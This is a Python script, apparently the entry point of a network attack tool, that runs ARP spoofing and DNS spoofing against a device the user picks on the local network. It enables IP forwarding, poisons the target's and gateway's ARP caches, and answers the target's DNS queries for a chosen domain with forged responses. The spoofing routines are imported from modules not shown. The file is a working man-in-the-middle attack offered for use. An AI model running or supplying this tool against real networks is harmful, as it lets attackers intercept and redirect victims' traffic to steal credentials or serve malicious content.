import os
import sys
import threading
import re
import argparse
import subprocess
from scapy.all import conf
from arp_spoofing import arp_spoof, restore_arp
from dns_spoofing import start_dns_sniffing
from cli_utils import select_target_device, print_network_info
from network_utils import (
    get_primary_ipv4_interface, get_ipv4_address, get_gateway_ip,
    discover_hosts, get_network_prefix, get_gateway_mac
)

def parse_args():
    parser = argparse.ArgumentParser(
        description=(
            "This script performs DNS spoofing on a selected target in your network.\n"
        )
    )
    parser.add_argument(
        "-target-domain",
        required=True,
        help=(
            "[Required] Domain to spoof (e.g., google.com). "
            "This is the domain for which DNS responses will be spoofed."
        )
    )
    parser.add_argument(
        "-dns-server",
        default="8.8.8.8",
        help=(
            "[Optional] Fallback DNS server for all other domains.\n"
            "Default: 8.8.8.8"
        )
    )
    return parser.parse_args()

def enable_ip_forwarding():
    if os.name == "nt":
        print("IP forwarding setup is not supported on Windows by this script.")
        sys.exit(1)
    try:
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print("IP forwarding enabled.")
    except Exception as e:
        print(f"Failed to enable IP forwarding: {e}")
        sys.exit(1)

def run_attack(target_ip, target_mac, gateway_ip, gateway_mac, interface, local_ip, target_domain, dns_server):
    """
    Starts ARP spoofing in a background thread and DNS spoofing in the main thread.
    Restore ARP tables when script is interrupted by user.
    """
    stop_event = threading.Event()
    arp_thread = threading.Thread(
        target=arp_spoof,
        args=(target_ip, target_mac, gateway_ip, gateway_mac, interface, stop_event),
        daemon=True
    )
    arp_thread.start()
    try:
        start_dns_sniffing(
            target_ip, target_mac, local_ip, interface, target_domain, dns_server
        )
    except KeyboardInterrupt:
        print("\nInterrupted. Restoring ARP tables and exiting...")
        stop_event.set()
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, interface)
        sys.exit(0)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(
            "Please run this script as root.\n"
            "This script requires Scapy, which needs elevated privileges for certain functions."
        )
        sys.exit(1)

    args = parse_args()
    TARGET_DOMAIN = args.target_domain
    DNS_SERVER = args.dns_server
    
    enable_ip_forwarding()

    INTERFACE = get_primary_ipv4_interface()
    LOCAL_IP = get_ipv4_address(INTERFACE)
    GATEWAY_IP = get_gateway_ip()
    print_network_info(INTERFACE, LOCAL_IP, GATEWAY_IP)

    TARGET_IP, TARGET_MAC, TARGET_NAME = select_target_device(LOCAL_IP)
    if not TARGET_IP or not TARGET_MAC or not TARGET_NAME:
        raise RuntimeError("No target device selected or found.")

    GATEWAY_MAC = get_gateway_mac(GATEWAY_IP, INTERFACE)
    
    run_attack(
        TARGET_IP, TARGET_MAC, GATEWAY_IP, GATEWAY_MAC, INTERFACE,
        LOCAL_IP, TARGET_DOMAIN, DNS_SERVER
    )